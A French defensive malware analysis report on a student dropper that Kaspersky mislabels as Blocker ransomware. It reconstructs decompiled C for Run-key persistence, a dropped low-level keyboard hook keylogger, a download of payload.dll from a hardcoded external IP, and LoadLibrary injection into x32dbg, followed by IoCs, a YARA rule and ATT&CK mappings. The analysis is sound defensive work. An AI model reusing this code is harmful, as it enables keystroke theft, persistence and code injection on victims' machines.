# UDS-Trojan-Ransom.Win32.Blocker.gen — Analyse détaillée

Langue : Français | English version: [README_EN.md](README_EN.md)

**Sample (fichier local) :** `UDS-Trojan-Ransom.Win32.Blocker.gen-f9a97d0e…ac94`  
**SHA256 (contenu) :** `a1858f5e497309fb46acd71e0dbdc6959975ece7345fe7b565484547253677f9`  
**Détection Kaspersky :** `UDS-Trojan-Ransom.Win32.Blocker.gen` — **nom générique / heuristique**  
**Nature réelle :** devoir étudiant (`malware_assignment`) — dropper + keylogger + injection DLL, **pas** un ransomware Blocker classique  
**Toolchain :** PE32 console, MSVC 19.41 / VS2022 17.11 LTCG (DIE)  
**Sources :** PE + Hex-Rays 9.4 (`artefacts/ida_export/*.c`) + ressource RCDATA extraite  

> Analyse **défensive / IR**. Pas d’exécution hors sandbox tierce.  
> Le hash dans le **nom de fichier** (`f9a97d0e…ac94`) **ne correspond pas** au SHA256 du contenu (`a1858f5e…`) — on documente les deux.

---

## 0. Synthèse Hex-Rays ↔ comportement

| Observation | Confirmation code |
|-------------|-------------------|
| PDB `malware_assignment` + user `aaa` | Chaîne CodeView dans `.rdata` |
| Cache la fenêtre console | `AllocConsole` → `FindWindowA("ConsoleWindowClass")` → `ShowWindow(..., 0)` |
| Se copie en `%ProgramData%\app_data.exe` | `SHGetFolderPathW(CSIDL_COMMON_APPDATA=35)` + `CopyFileW` |
| Persistance Run | `HKCU\...\Run` valeur **`Persistence`** |
| Drop keylogger depuis ressource | `FindResourceW(101, RT_RCDATA)` → `%APPDATA%\keylogger_hook.exe` + `ShellExecuteW` |
| Télécharge une DLL | `URLDownloadToFileW(http://210.125.101.75/payload.dll → C:\payload.dll)` |
| Injection dans le débogueur | Cherche **`x32dbg.exe`**, puis `VirtualAllocEx` / `WriteProcessMemory` / `CreateRemoteThread(LoadLibraryW)` |
| Keylogger WH_KEYBOARD_LL | PE embarqué : `SetWindowsHookExW(13, …)` → log vers `C:\Program Files (x86)\note.txt` |
| Chiffrement / note de rançon / wallpaper | **Absents** — le libellé « Blocker / Ransom » AV est trompeur |

**En une phrase :** au lancement, le programme se cache, se copie sous un nom banal, s’enregistre au démarrage, extrait et lance un keylogger, télécharge `payload.dll`, puis tente de l’injecter dans **x32dbg** s’il tourne — typique d’un **TP de malware development**, pas d’une campagne ransomware.

---

## 1. Point d’entrée — `main` @ `0x401040`

### À quoi ça sert ? (non expert)

Imagine un « kit de démo » en **cinq étapes**, toujours dans le même ordre :

1. Devenir discret (pas de fenêtre noire visible, fichier d’origine marqué caché).  
2. Se recopier dans un dossier système peu regardé (`ProgramData`) sous le nom `app_data.exe`.  
3. Demander à Windows : « relance-moi à chaque ouverture de session » (clé Run).  
4. Sortir de sa poche un second programme (keylogger) et le démarrer.  
5. Télécharger une DLL depuis Internet et, **si le débogueur x32dbg est ouvert**, la forcer à se charger dedans.

Il n’y a **pas** de parcours de disque, pas de chiffrement de documents, pas de fond d’écran de rançon.

### PE (rappel)

| Champ | Valeur |
|-------|--------|
| SHA256 | `a1858f5e497309fb46acd71e0dbdc6959975ece7345fe7b565484547253677f9` |
| MD5 | `f70b586e3306cd84c29e123a65226196` |
| SHA1 | `09bc2b7399499093f0ed36bfeab458846213689c` |
| Tag nom de fichier | `f9a97d0e6d8e8129f62f47b652d26ea7a27f1996760a41c6c9730062a601ac94` (**≠** contenu) |
| Machine | PE32 (`0x14C`), console, `asInvoker` |
| TimeDateStamp | **2024-11-21 05:14:45 UTC** (`0x673ec1C5`) |
| EP RVA | `0x15E9` — ImageBase `0x400000` |
| Packer | Aucun (faible taille, sections normales, strings en clair) |
| PDB | `C:\Users\aaa\source\repos\malware_assignment\Release\malware_assignment.pdb` |
| Taille | 22 528 octets |

### Code net (enchaînement)

```c
// main @ 0x401040 — artefacts/cleaned_main_dropper.c
AllocConsole();
ShowWindow(FindWindowA("ConsoleWindowClass", NULL), SW_HIDE);

GetModuleFileNameW(NULL, self, ...);
SetFileAttributesW(self, FILE_ATTRIBUTE_HIDDEN);

SHGetFolderPathW(NULL, CSIDL_COMMON_APPDATA /*35*/, ..., dest);
wcscat_s(dest, L"\\app_data.exe");
CopyFileW(self, dest, FALSE);

RegOpenKeyExW(HKCU, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", ...);
RegSetValueExW(hk, L"Persistence", 0, REG_SZ, path_to_app_data_exe, 0x208);

hrsrc = FindResourceW(NULL, MAKEINTRESOURCEW(0x65), RT_RCDATA); // id 101
// → WriteFile %APPDATA%\keylogger_hook.exe + ShellExecuteW("open", ...)

URLDownloadToFileW(NULL,
    L"http://210.125.101.75/payload.dll",
    L"C:\\payload.dll", 0, NULL);

// snapshot processus → si szExeFile == L"x32dbg.exe" → PID
// OpenProcess(PROCESS_ALL_ACCESS) → VirtualAllocEx →
// WriteProcessMemory(..., L"C:\\payload.dll", 0x1E) →
// CreateRemoteThread(..., LoadLibraryW, remote_buf)
```

---

## 2. Persistance et furtivité fichier

### À quoi ça sert ?

Sans élévation admin (`asInvoker`), le malware se contente de ce qu’un utilisateur standard peut faire :

- marquer **son propre** `.exe` comme **caché** (`FILE_ATTRIBUTE_HIDDEN = 2`) — l’explorateur ne l’affiche plus par défaut ;  
- se dupliquer dans **`%ProgramData%`** (`C:\ProgramData\app_data.exe`) — dossier partagé, nom volontairement « applicatif » ;  
- écrire **`HKCU\...\Run\Persistence`** pour survivre au reboot **dans le profil de l’utilisateur courant**.

### Ce qu’on voit (IR)

| Artefact | Valeur |
|----------|--------|
| Fichier | `%ProgramData%\app_data.exe` (copie du sample) |
| Registre | `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` → `Persistence` = chemin ci-dessus |
| Attribut | Original + copie potentiellement `H` |

**Pourquoi :** classic Run-key lab exercise — pas de service, pas de tâche planifiée, pas de WMI.

---

## 3. Drop du keylogger (ressource RCDATA 101)

### À quoi ça sert ?

Le dropper **embarque** un second PE (10 240 octets) comme ressource Windows de type **RCDATA**, identifiant **101** (`0x65`). Au runtime il l’écrit sous `%APPDATA%\keylogger_hook.exe` et le lance via le shell (`ShellExecuteW`, `nShowCmd = 10` = `SW_SHOWDEFAULT`).

C’est le même schéma qu’un installateur légitime qui extrait un helper — sauf que le helper pose un **hook clavier**.

### Extraction (déjà faite)

| Fichier | SHA256 | Rôle |
|---------|--------|------|
| [`artefacts/resources/keylogger_hook.exe`](artefacts/resources/keylogger_hook.exe) | `f74483530cc72874f5d10ebab521ea2ef47f3b319d1986b99dcf355384d35b9c` | PE extrait |
| [`artefacts/resources/RCDATA_101_1042.bin`](artefacts/resources/RCDATA_101_1042.bin) | idem | dump brut ressource |
| Manifeste | — | `asInvoker` uniquement |

PDB du second binaire :  
`C:\Users\aaa\source\repos\keylogger_hook\Release\keylogger_hook.pdb`  
(même user `aaa`, même toolchain VS2022 17.11).

---

## 4. Keylogger — `main` @ `0x401060` / hook `fn` @ `0x401000`

### À quoi ça sert ?

Le programme enfant :

1. cache aussi sa console ;  
2. installe un hook **`WH_KEYBOARD_LL` (13)** — « écoute basse niveau de tout le clavier de la session » ;  
3. boucle sur les messages Windows pour garder le hook vivant ;  
4. à chaque `WM_KEYDOWN` (256), ouvre `C:\Program Files (x86)\note.txt` en append et écrit.

### Code net

```c
// keylogger_hook — artefacts/cleaned_main_keylogger.c
hhk = SetWindowsHookExW(WH_KEYBOARD_LL /*13*/, fn, NULL, 0);
puts(hhk ? "All is good" : "Something went wrong :(");
while (GetMessageW(...) > 0) { TranslateMessage(...); DispatchMessageW(...); }

// callback fn
fopen("C:\\Program Files (x86)\\note.txt", "a+");
if (wParam == 256) { fputs((char *)lParam, stream); fclose(stream); }
return CallNextHookEx(...);
```

### Bugs / limites (lisibles dans Hex-Rays)

| Problème | Impact |
|----------|--------|
| `lParam` casté en `char *` + `fputs` | Pour un hook LL, `lParam` pointe vers `KBDLLHOOKSTRUCT`, **pas** une chaîne — écriture absurde / crash fréquent |
| `GetMessageW(lpMsg, …)` avec `lpMsg` global non alloué | Hex-Rays montre un pointeur global jamais `malloc` — autre signe de code étudiant incomplet |
| Chemin sous `Program Files (x86)` | En pratique souvent **accès refusé** sans admin |
| Messages console `All is good` | Invisibles (fenêtre masquée) sauf redirection |

**Pour l’IR :** même cassé, la **présence** du PE, du hook API et du chemin `note.txt` restent des IoCs utiles.

---

## 5. Téléchargement + injection dans `x32dbg.exe`

### À quoi ça sert ?

Deux idées pédagogiques collées bout à bout :

1. **Downloader :** `URLDownloadToFileW` tire `http://210.125.101.75/payload.dll` vers `C:\payload.dll` (racine système — souvent refusée sans droits élevés).  
2. **Injection classique LoadLibrary :** parcourir les processus avec Toolhelp, trouver le nom **`x32dbg.exe`**, ouvrir le process en `PROCESS_ALL_ACCESS`, allouer de la mémoire, y écrire le chemin Unicode `C:\payload.dll` (0x1E octets), créer un thread distant sur `kernel32!LoadLibraryW`.

### Pourquoi `x32dbg` ?

Cible typique de **lab** : l’étudiant lance le malware **depuis** ou **à côté** de son débogueur et « voit » la DLL se charger dans x32dbg. En production, un vrai malware viserait `explorer.exe`, un navigateur, etc. Ici le ciblage **explicite** du débogueur trahit le contexte devoir.

### IP `210.125.101.75`

| Champ | Valeur |
|-------|--------|
| Pays | Corée du Sud (KR) |
| Plage | `210.125.96.0/21` — **Sungshin Women’s University** (KREONet / KISTI) |
| Usage observé | URL unique hardcodée `…/payload.dll` |

Cohérent avec PDB `Users\aaa\...` et un serveur de cours / machine étudiante — **pas** un C2 ransomware connu.

### Ce qu’on n’a **pas**

- Le fichier distant `payload.dll` n’a **pas** été téléchargé ni exécuté dans cette analyse (pas d’exec hôte).  
- Si le PID reste `-1` (x32dbg absent), `OpenProcess` / la suite échouent silencieusement — pas de branche d’erreur riche.

---

## 6. Effets collatéraux / ce qui **manque**

| Attendu « ransomware Blocker » | Présent ? |
|--------------------------------|-----------|
| Chiffrement fichiers | Non |
| Note de rançon / BTC / onion | Non |
| Wallpaper / defacement | **Non** — voir [`artefacts/wallpaper_README.txt`](artefacts/wallpaper_README.txt) |
| Suppression VSS / bcdedit | Non |
| Mutex nommé | Non observé |
| Anti-debug autre que cible x32dbg | `IsDebuggerPresent` importé (CRT), pas de logique métier |

Le seul « camouflage UI » : masquer `ConsoleWindowClass`.

---

## 7. Timeline logique (un run)

```
t0  AllocConsole + hide console
t1  SetFileAttributesW(self, HIDDEN)
t2  CopyFile → %ProgramData%\app_data.exe
t3  RegSetValueExW Run\Persistence
t4  Extract RCDATA 101 → %APPDATA%\keylogger_hook.exe → ShellExecute
t5  URLDownloadToFileW → C:\payload.dll
t6  Enum processes ; if x32dbg.exe → inject LoadLibraryW(C:\payload.dll)
t7  return 0
     └─ (parallèle) keylogger_hook : WH_KEYBOARD_LL + append note.txt
```

---

## 8. IoCs

Voir aussi [`artefacts/iocs.txt`](artefacts/iocs.txt).

### Hashes

| Objet | SHA256 |
|-------|--------|
| Dropper (contenu) | `a1858f5e497309fb46acd71e0dbdc6959975ece7345fe7b565484547253677f9` |
| Keylogger embarqué | `f74483530cc72874f5d10ebab521ea2ef47f3b319d1986b99dcf355384d35b9c` |
| Tag nom dossier | `f9a97d0e6d8e8129f62f47b652d26ea7a27f1996760a41c6c9730062a601ac94` |

MD5 dropper : `f70b586e3306cd84c29e123a65226196`  
MD5 keylogger : `ab971710cf5ea9d60010ade57c831b6f`

### Réseau / fichiers / registre

| Type | IoC |
|------|-----|
| URL | `http://210.125.101.75/payload.dll` |
| IP | `210.125.101.75` |
| Drop DLL | `C:\payload.dll` |
| Copie | `%ProgramData%\app_data.exe` |
| Keylogger | `%APPDATA%\keylogger_hook.exe` |
| Log | `C:\Program Files (x86)\note.txt` |
| Run | `HKCU\...\Run` / `Persistence` |
| Processus cible | `x32dbg.exe` |

### YARA (esquisse défensive)

```yara
rule UDS_Blocker_gen_malware_assignment
{
  meta:
    description = "Student dropper malware_assignment / keylogger_hook"
  strings:
    $pdb1 = "malware_assignment.pdb" ascii
    $pdb2 = "keylogger_hook.pdb" ascii
    $url  = "210.125.101.75/payload.dll" wide
    $run  = "Persistence" wide
    $dbg  = "x32dbg.exe" wide
  condition:
    uint16(0) == 0x5A4D and 3 of them
}
```

---

## 9. MITRE ATT&CK

| ID | Technique | Preuve |
|----|-----------|--------|
| T1055.001 | Process Injection: Dynamic-link Library Injection | `CreateRemoteThread` + `LoadLibraryW` vers `x32dbg` |
| T1547.001 | Boot or Logon Autostart: Registry Run Keys | `...\Run\Persistence` |
| T1105 | Ingress Tool Transfer | `URLDownloadToFileW` |
| T1056.001 | Input Capture: Keylogging | `SetWindowsHookExW(WH_KEYBOARD_LL)` |
| T1564.001 | Hide Artifacts: Hidden Files and Directories | `FILE_ATTRIBUTE_HIDDEN` |
| T1620 | Reflective Code Loading / (embedded resource) | PE dans `RT_RCDATA` 101 |
| T1036.005 | Masquerading: Match Legitimate Name or Location | `app_data.exe` sous `ProgramData` |
| T1059 / exec | User Execution / Shell | `ShellExecuteW` sur le keylogger |

*Pas* de T1486 (Data Encrypted for Impact) malgré le nom AV.

---

## 10. Verdict / classification

| Libellé | Commentaire |
|---------|-------------|
| Kaspersky `UDS-Trojan-Ransom.Win32.Blocker.gen` | Famille **générique** « Blocker » + UDS ; **ne reflète pas** le comportement observé |
| Classification IR proposée | **Trojan.Win32.Dropper / Keylogger** (devoir) — loader + WH_KEYBOARD_LL + inject lab |
| Gravité lab | Faible sophistication, strings claires, bugs évidents ; dangereux surtout si `payload.dll` réel + droits admin |

---

## 11. Fichiers produits

| Chemin | Contenu |
|--------|---------|
| [`README.md`](README.md) / [`README_EN.md`](README_EN.md) | Ce rapport |
| [`artefacts/blocker_gen.exe`](artefacts/blocker_gen.exe) | Copie de travail du sample |
| [`artefacts/ida_export/blocker_gen.{c,asm,lst}`](artefacts/ida_export/) | Hex-Rays dropper |
| [`artefacts/ida_export/keylogger_hook.{c,asm,lst}`](artefacts/ida_export/) | Hex-Rays keylogger |
| [`artefacts/resources/keylogger_hook.exe`](artefacts/resources/keylogger_hook.exe) | PE extrait (RCDATA 101) |
| [`artefacts/cleaned_main_dropper.c`](artefacts/cleaned_main_dropper.c) | Reconstruction annotée |
| [`artefacts/cleaned_main_keylogger.c`](artefacts/cleaned_main_keylogger.c) | Idem keylogger |
| [`artefacts/iocs.txt`](artefacts/iocs.txt) | IoCs condensés |
| [`artefacts/wallpaper_README.txt`](artefacts/wallpaper_README.txt) | Absence de wallpaper documentée |

---

## 12. Non vérifié / hors scope

- Exécution sandbox (Any.RUN / local) — **non faite** ; pas d’URL Any.RUN fournie ; APIs publiques = *Not Found* pour les deux SHA256.  
- Contenu réel de `http://210.125.101.75/payload.dll` — **non récupéré** (politique no-exec / pas d’aide au déploiement).  
- Détections multi-AV à jour sur VirusTotal (page JS).  
- Corrélation éventuelle du hash *filename* `f9a97d0e…` avec un **autre** sample VirusShare.

---

## 13. Références

- Hex-Rays IDA Pro 9.4 batch (`~/ida-pro-9.4`, script `export_asm_c.py`)  
- Detect It Easy — MSVC 19.41 / VS2022 17.11  
- Whois KRNIC — plage Sungshin Women’s University (`210.125.96.0/21`)  
- [`../AGENTS.md`](../AGENTS.md) — méthodologie Articles
